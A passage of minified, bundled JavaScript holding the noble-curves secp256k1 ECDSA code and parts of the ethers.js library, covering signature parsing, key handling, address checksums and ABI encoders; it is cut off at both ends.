        }
        assertValidity() {
            if (!b(this.r))
                throw new Error("r must be 0 < r < CURVE.n");
            if (!b(this.s))
                throw new Error("s must be 0 < s < CURVE.n")
        }
        addRecoveryBit(_) {
            return new B(this.r,this.s,_)
        }
        recoverPublicKey(_) {
            const {r: $, s: z, recovery: K} = this
              , j = M(ts("msgHash", _));
            if (K == null || ![0, 1, 2, 3].includes(K))
                throw new Error("recovery id invalid");
            const ee = K === 2 || K === 3 ? $ + e.n : $;
            if (ee >= t.ORDER)
                throw new Error("recovery id 2 or 3 invalid");
            const ie = (K & 1) === 0 ? "02" : "03"
              , ae = f.fromHex(ie + v(ee))
              , he = l(ee)
              , me = a(-j * he)
              , Pe = a(z * he)
              , _e = f.BASE.multiplyAndAddUnsafe(ae, me, Pe);
            if (!_e)
                throw new Error("point at infinify");
            return _e.assertValidity(),
            _e
        }
        hasHighS() {
            return T(this.s)
        }
        normalizeS() {
            return this.hasHighS() ? new B(this.r,a(-this.s),this.recovery) : this
        }
        toDERRawBytes() {
            return Fd(this.toDERHex())
        }
        toDERHex() {
            return ql.hexFromSig({
                r: this.r,
                s: this.s
            })
        }
        toCompactRawBytes() {
            return Fd(this.toCompactHex())
        }
        toCompactHex() {
            return v(this.r) + v(this.s)
        }
    }
    const P = {
        isValidPrivateKey(R) {
            try {
                return h(R),
                !0
            } catch {
                return !1
            }
        },
        normPrivateKeyToScalar: h,
        randomPrivateKey: () => {
            const R = tF(e.n);
            return ade(e.randomBytes(R), e.n)
        }
        ,
        precompute(R=8, _=f.BASE) {
            return _._setWindowSize(R),
            _.multiply(BigInt(3)),
            _
        }
    };
    function O(R, _=!0) {
        return f.fromPrivateKey(R).toRawBytes(_)
    }
    function F(R) {
        const _ = R instanceof Uint8Array
          , $ = typeof R == "string"
          , z = (_ || $) && R.length;
        return _ ? z === i || z === n : $ ? z === 2 * i || z === 2 * n : R instanceof f
    }
    function D(R, _, $=!0) {
        if (F(R))
            throw new Error("first arg must be private key");
        if (!F(_))
            throw new Error("second arg must be public key");
        return f.fromHex(_).multiply(h(R)).toRawBytes($)
    }
    const I = e.bits2int || function(R) {
        const _ = nu(R)
          , $ = R.length * 8 - e.nBitLength;
        return $ > 0 ? _ >> BigInt($) : _
    }
      , M = e.bits2int_modN || function(R) {
        return a(I(R))
    }
      , C = a4(e.nBitLength);
    function W(R) {
        if (typeof R != "bigint")
            throw new Error("bigint expected");
        if (!(Ua <= R && R < C))
            throw new Error(`bigint expected < 2^${e.nBitLength}`);
        return Ud(R, e.nByteLength)
    }
    function k(R, _, $=H) {
        if (["recovered", "canonical"].some(Je => Je in $))
            throw new Error("sign() legacy options not supported");
        const {hash: z, randomBytes: K} = e;
        let {lowS: j, prehash: ee, extraEntropy: ie} = $;
        j == null && (j = !0),
        R = ts("msgHash", R),
        ee && (R = ts("prehashed msgHash", z(R)));
        const ae = M(R)
          , he = h(_)
          , me = [W(he), W(ae)];
        if (ie != null) {
            const Je = ie === !0 ? K(t.BYTES) : ie;
            me.push(ts("extraEntropy", Je))
        }
        const Pe = Yp(...me)
          , _e = ae;
        function Fe(Je) {
            const rt = I(Je);
            if (!b(rt))
                return;
            const xt = l(rt)
              , Tt = f.BASE.multiply(rt).toAffine()
              , Qe = a(Tt.x);
            if (Qe === Ua)
                return;
            const Ye = a(xt * a(_e + Qe * he));
            if (Ye === Ua)
                return;
            let Bt = (Tt.x === Qe ? 0 : 2) | Number(Tt.y & Di)
              , Dr = Ye;
            return j && T(Ye) && (Dr = x(Ye),
            Bt ^= 1),
            new B(Qe,Dr,Bt)
        }
        return {
            seed: Pe,
            k2sig: Fe
        }
    }
    const H = {
        lowS: e.lowS,
        prehash: !1
    }
      , X = {
        lowS: e.lowS,
        prehash: !1
    };
    function Y(R, _, $=H) {
        const {seed: z, k2sig: K} = k(R, _, $)
          , j = e;
        return J7(j.hash.outputLen, j.nByteLength, j.hmac)(z, K)
    }
    f.BASE._setWindowSize(8);
    function V(R, _, $, z=X) {
        var Tt;
        const K = R;
        if (_ = ts("msgHash", _),
        $ = ts("publicKey", $),
        "strict"in z)
            throw new Error("options.strict was renamed to lowS");
        const {lowS: j, prehash: ee} = z;
        let ie, ae;
        try {
            if (typeof K == "string" || K instanceof Uint8Array)
                try {
                    ie = B.fromDER(K)
                } catch (Qe) {
                    if (!(Qe instanceof ql.Err))
                        throw Qe;
                    ie = B.fromCompact(K)
                }
            else if (typeof K == "object" && typeof K.r == "bigint" && typeof K.s == "bigint") {
                const {r: Qe, s: Ye} = K;
                ie = new B(Qe,Ye)
            } else
                throw new Error("PARSE");
            ae = f.fromHex($)
        } catch (Qe) {
            if (Qe.message === "PARSE")
                throw new Error("signature must be Signature instance, Uint8Array or hex string");
            return !1
        }
        if (j && ie.hasHighS())
            return !1;
        ee && (_ = e.hash(_));
        const {r: he, s: me} = ie
          , Pe = M(_)
          , _e = l(me)
          , Fe = a(Pe * _e)
          , Je = a(he * _e)
          , rt = (Tt = f.BASE.multiplyAndAddUnsafe(ae, Fe, Je)) == null ? void 0 : Tt.toAffine();
        return rt ? a(rt.x) === he : !1
    }
    return {
        CURVE: e,
        getPublicKey: O,
        getSharedSecret: D,
        sign: Y,
        verify: V,
        ProjectivePoint: f,
        Signature: B,
        utils: P
    }
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function yde(r) {
    return {
        hash: r,
        hmac: (e, ...t) => Z1(r, e, zue(...t)),
        randomBytes: que
    }
}
function bde(r, e) {
    const t = o => gde({
        ...r,
        ...yde(o)
    });
    return Object.freeze({
        ...t(e),
        create: t
    })
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const nF = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f")
  , wR = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
  , mde = BigInt(1)
  , xA = BigInt(2)
  , vR = (r, e) => (r + e / xA) / e;
function xde(r) {
    const e = nF
      , t = BigInt(3)
      , o = BigInt(6)
      , i = BigInt(11)
      , n = BigInt(22)
      , s = BigInt(23)
      , a = BigInt(44)
      , l = BigInt(88)
      , f = r * r * r % e
      , h = f * f * r % e
      , p = Ei(h, t, e) * h % e
      , b = Ei(p, t, e) * h % e
      , v = Ei(b, xA, e) * f % e
      , T = Ei(v, i, e) * v % e
      , x = Ei(T, n, e) * T % e
      , E = Ei(x, a, e) * x % e
      , B = Ei(E, l, e) * E % e
      , P = Ei(B, a, e) * x % e
      , O = Ei(P, t, e) * h % e
      , F = Ei(O, s, e) * T % e
      , D = Ei(F, o, e) * f % e
      , I = Ei(D, xA, e);
    if (!wA.eql(wA.sqr(I), r))
        throw new Error("Cannot find square root");
    return I
}
const wA = sde(nF, void 0, void 0, {
    sqrt: xde
})
  , Oc = bde({
    a: BigInt(0),
    b: BigInt(7),
    Fp: wA,
    n: wR,
    Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
    Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
    h: BigInt(1),
    lowS: !0,
    endo: {
        beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
        splitScalar: r => {
            const e = wR
              , t = BigInt("0x3086d221a7d46bcde86c90e49284eb15")
              , o = -mde * BigInt("0xe4437ed6010e88286f547fa90abfe4c3")
              , i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8")
              , n = t
              , s = BigInt("0x100000000000000000000000000000000")
              , a = vR(n * r, e)
              , l = vR(-o * r, e);
            let f = Wo(r - a * t - l * i, e)
              , h = Wo(-a * o - l * n, e);
            const p = f > s
              , b = h > s;
            if (p && (f = e - f),
            b && (h = e - h),
            f > s || h > s)
                throw new Error("splitScalar: Endomorphism failed, k=" + r);
            return {
                k1neg: p,
                k1: f,
                k2neg: b,
                k2: h
            }
        }
    }
}, eh);
BigInt(0);
Oc.ProjectivePoint;
const oF = "0x0000000000000000000000000000000000000000"
  , TR = "0x0000000000000000000000000000000000000000000000000000000000000000"
  , wde = `Ethereum Signed Message:
`
  , ER = BigInt(0)
  , AR = BigInt(1)
  , PR = BigInt(2)
  , CR = BigInt(27)
  , SR = BigInt(28)
  , cm = BigInt(35)
  , Mf = {};
function BR(r) {
    return qc(ho(r), 32)
}
var ed, td, rd, Yl;
const Qi = class Qi {
    constructor(e, t, o, i) {
        ft(this, ed);
        ft(this, td);
        ft(this, rd);
        ft(this, Yl);
        el(e, Mf, "Signature"),
        He(this, ed, t),
        He(this, td, o),
        He(this, rd, i),
        He(this, Yl, null)
    }
    get r() {
        return Ae(this, ed)
    }
    set r(e) {
        pe(Fp(e) === 32, "invalid r", "value", e),
        He(this, ed, et(e))
    }
    get s() {
        return Ae(this, td)
    }
    set s(e) {
        pe(Fp(e) === 32, "invalid s", "value", e);
        const t = et(e);
        pe(parseInt(t.substring(0, 3)) < 8, "non-canonical s", "value", t),
        He(this, td, t)
    }
    get v() {
        return Ae(this, rd)
    }
    set v(e) {
        const t = jn(e, "value");
        pe(t === 27 || t === 28, "invalid v", "v", e),
        He(this, rd, t)
    }
    get networkV() {
        return Ae(this, Yl)
    }
    get legacyChainId() {
        const e = this.networkV;
        return e == null ? null : Qi.getChainId(e)
    }
    get yParity() {
        return this.v === 27 ? 0 : 1
    }
    get yParityAndS() {
        const e = pt(this.s);
        return this.yParity && (e[0] |= 128),
        et(e)
    }
    get compactSerialized() {
        return Ar([this.r, this.yParityAndS])
    }
    get serialized() {
        return Ar([this.r, this.s, this.yParity ? "0x1c" : "0x1b"])
    }
    [Symbol.for("nodejs.util.inspect.custom")]() {
        return `Signature { r: "${this.r}", s: "${this.s}", yParity: ${this.yParity}, networkV: ${this.networkV} }`
    }
    clone() {
        const e = new Qi(Mf,this.r,this.s,this.v);
        return this.networkV && He(e, Yl, this.networkV),
        e
    }
    toJSON() {
        const e = this.networkV;
        return {
            _type: "signature",
            networkV: e != null ? e.toString() : null,
            r: this.r,
            s: this.s,
            v: this.v
        }
    }
    static getChainId(e) {
        const t = Er(e, "v");
        return t == CR || t == SR ? ER : (pe(t >= cm, "invalid EIP-155 v", "v", e),
        (t - cm) / PR)
    }
    static getChainIdV(e, t) {
        return Er(e) * PR + BigInt(35 + t - 27)
    }
    static getNormalizedV(e) {
        const t = Er(e);
        return t === ER || t === CR ? 27 : t === AR || t === SR ? 28 : (pe(t >= cm, "invalid v", "v", e),
        t & AR ? 27 : 28)
    }
    static from(e) {
        function t(f, h) {
            pe(f, h, "signature", e)
        }
        if (e == null)
            return new Qi(Mf,TR,TR,27);
        if (typeof e == "string") {
            const f = pt(e, "signature");
            if (f.length === 64) {
                const h = et(f.slice(0, 32))
                  , p = f.slice(32, 64)
                  , b = p[0] & 128 ? 28 : 27;
                return p[0] &= 127,
                new Qi(Mf,h,et(p),b)
            }
            if (f.length === 65) {
                const h = et(f.slice(0, 32))
                  , p = f.slice(32, 64);
                t((p[0] & 128) === 0, "non-canonical s");
                const b = Qi.getNormalizedV(f[64]);
                return new Qi(Mf,h,et(p),b)
            }
            t(!1, "invalid raw signature length")
        }
        if (e instanceof Qi)
            return e.clone();
        const o = e.r;
        t(o != null, "missing r");
        const i = BR(o)
          , n = function(f, h) {
            if (f != null)
                return BR(f);
            if (h != null) {
                t(ro(h, 32), "invalid yParityAndS");
                const p = pt(h);
                return p[0] &= 127,
                et(p)
            }
            t(!1, "missing s")
        }(e.s, e.yParityAndS);
        t((pt(n)[0] & 128) == 0, "non-canonical s");
        const {networkV: s, v: a} = function(f, h, p) {
            if (f != null) {
                const b = Er(f);
                return {
                    networkV: b >= cm ? b : void 0,
                    v: Qi.getNormalizedV(b)
                }
            }
            if (h != null)
                return t(ro(h, 32), "invalid yParityAndS"),
                {
                    v: pt(h)[0] & 128 ? 28 : 27
                };
            if (p != null) {
                switch (jn(p, "sig.yParity")) {
                case 0:
                    return {
                        v: 27
                    };
                case 1:
                    return {
                        v: 28
                    }
                }
                t(!1, "invalid yParity")
            }
            t(!1, "missing v")
        }(e.v, e.yParityAndS, e.yParity)
          , l = new Qi(Mf,i,n,a);
        return s && He(l, Yl, s),
        t(e.yParity == null || jn(e.yParity, "sig.yParity") === l.yParity, "yParity mismatch"),
        t(e.yParityAndS == null || e.yParityAndS === l.yParityAndS, "yParityAndS mismatch"),
        l
    }
}
;
ed = new WeakMap,
td = new WeakMap,
rd = new WeakMap,
Yl = new WeakMap;
let mo = Qi;
var Wa;
const kl = class kl {
    constructor(e) {
        ft(this, Wa);
        pe(Fp(e) === 32, "invalid private key", "privateKey", "[REDACTED]"),
        He(this, Wa, et(e))
    }
    get privateKey() {
        return Ae(this, Wa)
    }
    get publicKey() {
        return kl.computePublicKey(Ae(this, Wa))
    }
    get compressedPublicKey() {
        return kl.computePublicKey(Ae(this, Wa), !0)
    }
    sign(e) {
        pe(Fp(e) === 32, "invalid digest length", "digest", e);
        const t = Oc.sign(eo(e), eo(Ae(this, Wa)), {
            lowS: !0
        });
        return mo.from({
            r: cs(t.r, 32),
            s: cs(t.s, 32),
            v: t.recovery ? 28 : 27
        })
    }
    computeSharedSecret(e) {
        const t = kl.computePublicKey(e);
        return et(Oc.getSharedSecret(eo(Ae(this, Wa)), pt(t), !1))
    }
    static computePublicKey(e, t) {
        let o = pt(e, "key");
        if (o.length === 32) {
            const n = Oc.getPublicKey(o, !!t);
            return et(n)
        }
        if (o.length === 64) {
            const n = new Uint8Array(65);
            n[0] = 4,
            n.set(o, 1),
            o = n
        }
        const i = Oc.ProjectivePoint.fromHex(o);
        return et(i.toRawBytes(t))
    }
    static recoverPublicKey(e, t) {
        pe(Fp(e) === 32, "invalid digest length", "digest", e);
        const o = mo.from(t);
        let i = Oc.Signature.fromCompact(eo(Ar([o.r, o.s])));
        i = i.addRecoveryBit(o.yParity);
        const n = i.recoverPublicKey(eo(e));
        return pe(n != null, "invalid signautre for digest", "signature", t),
        "0x" + n.toHex(!1)
    }
    static addPoints(e, t, o) {
        const i = Oc.ProjectivePoint.fromHex(kl.computePublicKey(e).substring(2))
          , n = Oc.ProjectivePoint.fromHex(kl.computePublicKey(t).substring(2));
        return "0x" + i.add(n).toHex(!!o)
    }
}
;
Wa = new WeakMap;
let li = kl;
const vde = BigInt(0)
  , Tde = BigInt(36);
function _R(r) {
    r = r.toLowerCase();
    const e = r.substring(2).split("")
      , t = new Uint8Array(40);
    for (let i = 0; i < 40; i++)
        t[i] = e[i].charCodeAt(0);
    const o = pt(ir(t));
    for (let i = 0; i < 40; i += 2)
        o[i >> 1] >> 4 >= 8 && (e[i] = e[i].toUpperCase()),
        (o[i >> 1] & 15) >= 8 && (e[i + 1] = e[i + 1].toUpperCase());
    return "0x" + e.join("")
}
const c4 = {};
for (let r = 0; r < 10; r++)
    c4[String(r)] = String(r);
for (let r = 0; r < 26; r++)
    c4[String.fromCharCode(65 + r)] = String(10 + r);
const IR = 15;
function Ede(r) {
    r = r.toUpperCase(),
    r = r.substring(4) + r.substring(0, 2) + "00";
    let e = r.split("").map(o => c4[o]).join("");
    for (; e.length >= IR; ) {
        let o = e.substring(0, IR);
        e = parseInt(o, 10) % 97 + e.substring(o.length)
    }
    let t = String(98 - parseInt(e, 10) % 97);
    for (; t.length < 2; )
        t = "0" + t;
    return t
}
const Ade = function() {
    const r = {};
    for (let e = 0; e < 36; e++) {
        const t = "0123456789abcdefghijklmnopqrstuvwxyz"[e];
        r[t] = BigInt(e)
    }
    return r
}();
function Pde(r) {
    r = r.toLowerCase();
    let e = vde;
    for (let t = 0; t < r.length; t++)
        e = e * Tde + Ade[r[t]];
    return e
}
function fi(r) {
    if (pe(typeof r == "string", "invalid address", "address", r),
    r.match(/^(0x)?[0-9a-fA-F]{40}$/)) {
        r.startsWith("0x") || (r = "0x" + r);
        const e = _R(r);
        return pe(!r.match(/([A-F].*[a-f])|([a-f].*[A-F])/) || e === r, "bad address checksum", "address", r),
        e
    }
    if (r.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)) {
        pe(r.substring(2, 4) === Ede(r), "bad icap checksum", "address", r);
        let e = Pde(r.substring(4)).toString(16);
        for (; e.length < 40; )
            e = "0" + e;
        return _R("0x" + e)
    }
    pe(!1, "invalid address", "address", r)
}
function Cde(r) {
    return r && typeof r.getAddress == "function"
}
async function D2(r, e) {
    const t = await e;
    return (t == null || t === "0x0000000000000000000000000000000000000000") && (Mt(typeof r != "string", "unconfigured name", "UNCONFIGURED_NAME", {
        value: r
    }),
    pe(!1, "invalid AddressLike value; did not resolve to a value address", "target", r)),
    fi(t)
}
function l1(r, e) {
    if (typeof r == "string")
        return r.match(/^0x[0-9a-f]{40}$/i) ? fi(r) : (Mt(e != null, "ENS resolution requires a provider", "UNSUPPORTED_OPERATION", {
            operation: "resolveName"
        }),
        D2(r, e.resolveName(r)));
    if (Cde(r))
        return D2(r, r.getAddress());
    if (r && typeof r.then == "function")
        return D2(r, r);
    pe(!1, "unsupported addressable value", "target", r)
}
const Pa = {};
function ct(r, e) {
    let t = !1;
    return e < 0 && (t = !0,
    e *= -1),
    new Uo(Pa,`${t ? "" : "u"}int${e}`,r,{
        signed: t,
        width: e
    })
}
function br(r, e) {
    return new Uo(Pa,`bytes${e || ""}`,r,{
        size: e
    })
}
const OR = Symbol.for("_ethers_typed");
var Xl;
const Sa = class Sa {
    constructor(e, t, o, i) {
        we(this, "type");
        we(this, "value");
        ft(this, Xl);
        we(this, "_typedSymbol");
        i == null && (i = null),
        el(Pa, e, "Typed"),
        tr(this, {
            _typedSymbol: OR,
            type: t,
            value: o
        }),
        He(this, Xl, i),
        this.format()
    }
    format() {
        if (this.type === "array")
            throw new Error("");
        if (this.type === "dynamicArray")
            throw new Error("");
        return this.type === "tuple" ? `tuple(${this.value.map(e => e.format()).join(",")})` : this.type
    }
    defaultValue() {
        return 0
    }
    minValue() {
        return 0
    }
    maxValue() {
        return 0
    }
    isBigInt() {
        return !!this.type.match(/^u?int[0-9]+$/)
    }
    isData() {
        return this.type.startsWith("bytes")
    }
    isString() {
        return this.type === "string"
    }
    get tupleName() {
        if (this.type !== "tuple")
            throw TypeError("not a tuple");
        return Ae(this, Xl)
    }
    get arrayLength() {
        if (this.type !== "array")
            throw TypeError("not an array");
        return Ae(this, Xl) === !0 ? -1 : Ae(this, Xl) === !1 ? this.value.length : null
    }
    static from(e, t) {
        return new Sa(Pa,e,t)
    }
    static uint8(e) {
        return ct(e, 8)
    }
    static uint16(e) {
        return ct(e, 16)
    }
    static uint24(e) {
        return ct(e, 24)
    }
    static uint32(e) {
        return ct(e, 32)
    }
    static uint40(e) {
        return ct(e, 40)
    }
    static uint48(e) {
        return ct(e, 48)
    }
    static uint56(e) {
        return ct(e, 56)
    }
    static uint64(e) {
        return ct(e, 64)
    }
    static uint72(e) {
        return ct(e, 72)
    }
    static uint80(e) {
        return ct(e, 80)
    }
    static uint88(e) {
        return ct(e, 88)
    }
    static uint96(e) {
        return ct(e, 96)
    }
    static uint104(e) {
        return ct(e, 104)
    }
    static uint112(e) {
        return ct(e, 112)
    }
    static uint120(e) {
        return ct(e, 120)
    }
    static uint128(e) {
        return ct(e, 128)
    }
    static uint136(e) {
        return ct(e, 136)
    }
    static uint144(e) {
        return ct(e, 144)
    }
    static uint152(e) {
        return ct(e, 152)
    }
    static uint160(e) {
        return ct(e, 160)
    }
    static uint168(e) {
        return ct(e, 168)
    }
    static uint176(e) {
        return ct(e, 176)
    }
    static uint184(e) {
        return ct(e, 184)
    }
    static uint192(e) {
        return ct(e, 192)
    }
    static uint200(e) {
        return ct(e, 200)
    }
    static uint208(e) {
        return ct(e, 208)
    }
    static uint216(e) {
        return ct(e, 216)
    }
    static uint224(e) {
        return ct(e, 224)
    }
    static uint232(e) {
        return ct(e, 232)
    }
    static uint240(e) {
        return ct(e, 240)
    }
    static uint248(e) {
        return ct(e, 248)
    }
    static uint256(e) {
        return ct(e, 256)
    }
    static uint(e) {
        return ct(e, 256)
    }
    static int8(e) {
        return ct(e, -8)
    }
    static int16(e) {
        return ct(e, -16)
    }
    static int24(e) {
        return ct(e, -24)
    }
    static int32(e) {
        return ct(e, -32)
    }
    static int40(e) {
        return ct(e, -40)
    }
    static int48(e) {
        return ct(e, -48)
    }
    static int56(e) {
        return ct(e, -56)
    }
    static int64(e) {
        return ct(e, -64)
    }
    static int72(e) {
        return ct(e, -72)
    }
    static int80(e) {
        return ct(e, -80)
    }
    static int88(e) {
        return ct(e, -88)
    }
    static int96(e) {
        return ct(e, -96)
    }
    static int104(e) {
        return ct(e, -104)
    }
    static int112(e) {
        return ct(e, -112)
    }
    static int120(e) {
        return ct(e, -120)
    }
    static int128(e) {
        return ct(e, -128)
    }
    static int136(e) {
        return ct(e, -136)
    }
    static int144(e) {
        return ct(e, -144)
    }
    static int152(e) {
        return ct(e, -152)
    }
    static int160(e) {
        return ct(e, -160)
    }
    static int168(e) {
        return ct(e, -168)
    }
    static int176(e) {
        return ct(e, -176)
    }
    static int184(e) {
        return ct(e, -184)
    }
    static int192(e) {
        return ct(e, -192)
    }
    static int200(e) {
        return ct(e, -200)
    }
    static int208(e) {
        return ct(e, -208)
    }
    static int216(e) {
        return ct(e, -216)
    }
    static int224(e) {
        return ct(e, -224)
    }
    static int232(e) {
        return ct(e, -232)
    }
    static int240(e) {
        return ct(e, -240)
    }
    static int248(e) {
        return ct(e, -248)
    }
    static int256(e) {
        return ct(e, -256)
    }
    static int(e) {
        return ct(e, -256)
    }
    static bytes1(e) {
        return br(e, 1)
    }
    static bytes2(e) {
        return br(e, 2)
    }
    static bytes3(e) {
        return br(e, 3)
    }
    static bytes4(e) {
        return br(e, 4)
    }
    static bytes5(e) {
        return br(e, 5)
    }
    static bytes6(e) {
        return br(e, 6)
    }
    static bytes7(e) {
        return br(e, 7)
    }
    static bytes8(e) {
        return br(e, 8)
    }
    static bytes9(e) {
        return br(e, 9)
    }
    static bytes10(e) {
        return br(e, 10)
    }
    static bytes11(e) {
        return br(e, 11)
    }
    static bytes12(e) {
        return br(e, 12)
    }
    static bytes13(e) {
        return br(e, 13)
    }
    static bytes14(e) {
        return br(e, 14)
    }
    static bytes15(e) {
        return br(e, 15)
    }
    static bytes16(e) {
        return br(e, 16)
    }
    static bytes17(e) {
        return br(e, 17)
    }
    static bytes18(e) {
        return br(e, 18)
    }
    static bytes19(e) {
        return br(e, 19)
    }
    static bytes20(e) {
        return br(e, 20)
    }
    static bytes21(e) {
        return br(e, 21)
    }
    static bytes22(e) {
        return br(e, 22)
    }
    static bytes23(e) {
        return br(e, 23)
    }
    static bytes24(e) {
        return br(e, 24)
    }
    static bytes25(e) {
        return br(e, 25)
    }
    static bytes26(e) {
        return br(e, 26)
    }
    static bytes27(e) {
        return br(e, 27)
    }
    static bytes28(e) {
        return br(e, 28)
    }
    static bytes29(e) {
        return br(e, 29)
    }
    static bytes30(e) {
        return br(e, 30)
    }
    static bytes31(e) {
        return br(e, 31)
    }
    static bytes32(e) {
        return br(e, 32)
    }
    static address(e) {
        return new Sa(Pa,"address",e)
    }
    static bool(e) {
        return new Sa(Pa,"bool",!!e)
    }
    static bytes(e) {
        return new Sa(Pa,"bytes",e)
    }
    static string(e) {
        return new Sa(Pa,"string",e)
    }
    static array(e, t) {
        throw new Error("not implemented yet")
    }
    static tuple(e, t) {
        throw new Error("not implemented yet")
    }
    static overrides(e) {
        return new Sa(Pa,"overrides",Object.assign({}, e))
    }
    static isTyped(e) {
        return e && typeof e == "object" && "_typedSymbol"in e && e._typedSymbol === OR
    }
    static dereference(e, t) {
        if (Sa.isTyped(e)) {
            if (e.type !== t)
                throw new Error(`invalid type: expecetd ${t}, got ${e.type}`);
            return e.value
        }
        return e
    }
}
;
Xl = new WeakMap;
let Uo = Sa;
class Sde extends Ka {
    constructor(e) {
        super("address", "address", e, !1)
    }
    defaultValue() {
        return "0x0000000000000000000000000000000000000000"
    }
    encode(e, t) {
        let o = Uo.dereference(t, "string");
        try {
            o = fi(o)
        } catch (i) {
            return this._throwError(i.message, t)
        }
        return e.writeValue(o)
    }
    decode(e) {
        return fi(cs(e.readValue(), 20))
    }
}
class Bde extends Ka {
    constructor(t) {
        super(t.name, t.type, "_", t.dynamic);
        we(this, "coder");
        this.coder = t
    }
    defaultValue() {
        return this.coder.defaultValue()
    }
    encode(t, o) {
        return this.coder.encode(t, o)
    }
    decode(t) {
        return this.coder.decode(t)
    }
}
function iF(r, e, t) {
    let o = [];
    if (Array.isArray(t))
        o = t;
    else if (t && typeof t == "object") {
        let l = {};
        o = e.map(f => {
            const h = f.localName;
            return Mt(h, "cannot encode object for signature with missing names", "INVALID_ARGUMENT", {
                argument: "values",
                info: {
                    coder: f
                },
                value: t
            }),
            Mt(!l[h], "cannot encode object for signature with duplicate names", "INVALID_ARGUMENT", {
                argument: "values",
                info: {
                    coder: f
                },
                value: t
            }),
            l[h] = !0,
            t[h]
        }
        )
    } else
        pe(!1, "invalid tuple value", "tuple", t);
    pe(e.length === o.length, "types/value length mismatch", "tuple", t);
    let i = new hA
      , n = new hA
      , s = [];
    e.forEach( (l, f) => {
        let h = o[f];
        if (l.dynamic) {
            let p = n.length;
            l.encode(n, h);
            let b = i.writeUpdatableValue();
            s.push(v => {
                b(v + p)
            }
            )
        } else
            l.encode(i, h)
    }
    ),
    s.forEach(l => {
        l(i.length)
    }
    );
    let a = r.appendWriter(i);
    return a += r.appendWriter(n),
    a
}
function sF(r, e) {
    let t = []
      , o = []
      , i = r.subReader(0);
    return e.forEach(n => {
        let s = null;
        if (n.dynamic) {
            let a = r.readIndex()
              , l = i.subReader(a);
            try {
                s = n.decode(l)
            } catch (f) {
                if (eR(f, "BUFFER_OVERRUN"))
                    throw f;
                s = f,
                s.baseType = n.name,
                s.name = n.localName,
                s.type = n.type
            }
        } else
            try {
                s = n.decode(r)
            } catch (a) {
                if (eR(a, "BUFFER_OVERRUN"))
                    throw a;
                s = a,
                s.baseType = n.name,
                s.name = n.localName,
                s.type = n.type
            }
        if (s == null)
            throw new Error("investigate");
        t.push(s),
        o.push(n.localName || null)
    }
    ),
    Wd.fromItems(t, o)
}
class _de extends Ka {
    constructor(t, o, i) {
        const n = t.type + "[" + (o >= 0 ? o : "") + "]"
          , s = o === -1 || t.dynamic;
        super("array", n, i, s);
        we(this, "coder");
        we(this, "length");
        tr(this, {
            coder: t,
            length: o
        })
    }
    defaultValue() {
        const t = this.coder.defaultValue()
          , o = [];
        for (let i = 0; i < this.length; i++)
            o.push(t);
        return o
    }
    encode(t, o) {
        const i = Uo.dereference(o, "array");
        Array.isArray(i) || this._throwError("expected array value", i);
        let n = this.length;
        n === -1 && (n = i.length,
        t.writeValue(i.length)),
        JD(i.length, n, "coder array" + (this.localName ? " " + this.localName : ""));
        let s = [];
        for (let a = 0; a < i.length; a++)
            s.push(this.coder);
        return iF(t, s, i)
    }
    decode(t) {
        let o = this.length;
        o === -1 && (o = t.readIndex(),
        Mt(o * po <= t.dataLength, "insufficient data length", "BUFFER_OVERRUN", {
            buffer: t.bytes,
            offset: o * po,
            length: t.dataLength
        }));
        let i = [];
        for (let n = 0; n < o; n++)
            i.push(new Bde(this.coder));
        return sF(t, i)
    }
}
class Ide extends Ka {
    constructor(e) {
        super("bool", "bool", e, !1)
    }
    defaultValue() {
        return !1
    }
    encode(e, t) {
        const o = Uo.dereference(t, "bool");
        return e.writeValue(o ? 1 : 0)
    }
    decode(e) {
        return !!e.readValue()
    }
}
class aF extends Ka {
    constructor(e, t) {
        super(e, e, t, !0)
    }
    defaultValue() {
        return "0x"
    }
    encode(e, t) {
        t = eo(t);
        let o = e.writeValue(t.length);
        return o += e.writeBytes(t),
        o
    }
    decode(e) {
        return e.readBytes(e.readIndex(), !0)
    }
}
class Ode extends aF {
    constructor(e) {
        super("bytes", e)
    }
    decode(e) {
        return et(super.decode(e))
    }
}
class Rde extends Ka {
    constructor(t, o) {
        let i = "bytes" + String(t);
        super(i, i, o, !1);
        we(this, "size");
        tr(this, {
            size: t
        }, {
            size: "number"
        })
    }
    defaultValue() {
        return "0x0000000000000000000000000000000000000000000000000000000000000000".substring(0, 2 + this.size * 2)
    }
    encode(t, o) {
        let i = eo(Uo.dereference(o, this.type));
        return i.length !== this.size && this._throwError("incorrect data length", o),
        t.writeBytes(i)
    }
    decode(t) {
        return et(t.readBytes(this.size))
    }
}
const Wde = new Uint8Array([]);
class Mde extends Ka {
    constructor(e) {
        super("null", "", e, !1)
    }
    defaultValue() {
        return null
    }
    encode(e, t) {
        return t != null && this._throwError("not null", t),
        e.writeBytes(Wde)
    }
    decode(e) {
        return e.readBytes(0),
        null
    }
}
const Nde = BigInt(0)
  , Dde = BigInt(1)
  , Fde = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
class Ude extends Ka {
    constructor(t, o, i) {
        const n = (o ? "int" : "uint") + t * 8;
        super(n, n, i, !1);
        we(this, "size");
        we(this, "signed");
        tr(this, {
            size: t,
            signed: o
        }, {
            size: "number",
            signed: "boolean"
        })
    }
    defaultValue() {
        return 0
    }
    encode(t, o) {
        let i = Er(Uo.dereference(o, this.type))
          , n = Hf(Fde, po * 8);
        if (this.signed) {
            let s = Hf(n, this.size * 8 - 1);
            (i > s || i < -(s + Dde)) && this._throwError("value out-of-bounds", o),
            i = Z3(i, 8 * po)
        } else
            (i < Nde || i > Hf(n, this.size * 8)) && this._throwError("value out-of-bounds", o);
        return t.writeValue(i)
    }
    decode(t) {
        let o = Hf(t.readValue(), this.size * 8);
        return this.signed && (o = Pue(o, this.size * 8)),
        o
    }
}
class kde extends aF {
    constructor(e) {
        super("string", e)
    }
    defaultValue() {
        return ""
    }
    encode(e, t) {
